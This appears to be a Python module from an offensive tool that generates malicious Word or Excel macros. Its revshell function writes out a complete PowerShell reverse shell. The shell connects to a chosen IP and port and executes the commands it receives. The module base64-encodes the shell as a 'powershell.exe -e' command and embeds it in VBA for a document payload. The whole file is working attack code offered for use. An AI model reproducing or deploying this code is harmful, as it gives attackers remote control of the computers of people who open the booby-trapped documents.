from utils.vba_synthax import convertToVbaSynthax
from payloads.Word import payloadWord
from payloads.Excel import payloadExcel
from utils.utils import powershell_base64
import logging
logger = logging.getLogger(__name__)





def revshell(file, ip, port):
        revshell = f"""$client = New-Object System.Net.Sockets.TCPClient('{ip}', {port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
}}
$client.Close();"""
        payloadBase64 = powershell_base64(revshell)
        payload = f'powershell.exe -e {payloadBase64}'
        print(f"[+] Succesfully generated reverse shell for {ip}:{port}\n")
        print("[+] Converted to base64 and Into random value to please vba synthax...\n")
        print("Succesfully generated macros content !!")
        
        payload = convertToVbaSynthax(payload)
        
        if file == "Excel":
            payloadExcel(payload)
        elif file == "Word":
            payloadWord(payload)